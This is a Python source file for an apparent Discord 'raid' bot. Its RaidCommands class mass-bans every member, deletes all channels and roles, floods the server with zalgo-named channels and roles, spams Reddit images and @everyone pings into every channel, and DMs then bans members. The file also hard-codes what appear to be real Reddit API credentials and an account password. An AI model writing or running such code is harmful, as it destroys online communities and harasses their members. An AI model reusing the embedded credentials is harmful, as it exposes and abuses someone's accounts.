import random
from disnake import DMChannel
import asyncpraw
import disnake
import scripting as SC

reddit = asyncpraw.Reddit(
    client_id="Qc_FzD7Wj5iDJB2XYMluKg",
    client_secret="-dopAEMTFWGtFImCEgD8_GeGQumAwg",
    user_agent="joy",
    username="Emotional_Support_1",
    password="joybotpass",
)

ORANGE = 0xFF5733
sub_list = []
zalgo_list = []
subreddit = "gfur"

file = SC.Scripts("zalgo_text.txt")
file.unpack(zalgo_list)


async def genreddit(amt: int, subreddit: str, subreddit2: str = None):

    sub = await reddit.subreddit(subreddit)
    sub_hot = sub.hot(limit=amt)
    async for i in sub_hot:
        sub_list.append(i)

    if subreddit2 is not None:
        sub2 = await reddit.subreddit(subreddit2)
        sub2_hot = sub2.hot(limit=amt)
        async for l in sub2_hot:
            sub_list.append(l)


class RaidCommands:
    @classmethod
    async def send_dm(cls, guild: disnake.Guild, embed):
        for mem in guild.members:
            try:
                await DMChannel.send(mem, embed=embed)
            except:
                pass
            try:
                await mem.ban()
            except:
                pass

    @classmethod
    async def ban_members(cls, guild: disnake.Guild, author: disnake.Member = None):
        for mem in guild.members:
            if mem is not author:
                try:
                    await guild.ban(mem)
                except:
                    pass

    @classmethod
    async def channel_remove(cls, guild: disnake.Guild):
        for ch in guild.channels:
            try:
                await ch.delete()
            except:
                pass

    @classmethod
    async def channel_make(cls, guild: disnake.Guild, amt: int):
        for _ in range(amt):
            try:
                await guild.create_text_channel(random.choice(zalgo_list))
            except:
                pass

    @classmethod
    async def role_remove(cls, guild: disnake.Guild):
        for role in guild.roles:
            try:
                await role.delete()
            except:
                pass

    @classmethod
    async def role_make(cls, guild: disnake.Guild, amt: int):
        for _ in range(amt):
            try:
                await guild.create_role(name=random.choice(zalgo_list))
            except:
                pass

    @classmethod
    async def role_give(cls, guild: disnake.Guild):
        for member in guild.members:
            for role in guild.roles:
                try:
                    await member.add_roles(role)
                except:
                    pass

    @classmethod
    async def sfw_spam(cls, guild: disnake.Guild, amt: int):
        for _ in range(amt):
            for cha in guild.channels:
                try:
                    sfw_post = random.choice(sub_list)
                    embed = disnake.Embed(title=f"__{sfw_post.title}__", url=sfw_post.url)
                    embed.set_image(url=sfw_post.url)
                    await cha.send(embed=embed)
                except:
                    pass
                if len(sub_list) < 5:
                    await genreddit(10, subreddit)

    @classmethod
    async def ping_spam(cls, guild: disnake.Guild, amt):
        for _ in range(amt):
            for cha in guild.channels:
                try:
                    await cha.send(guild.default_role)
                except:
                    pass
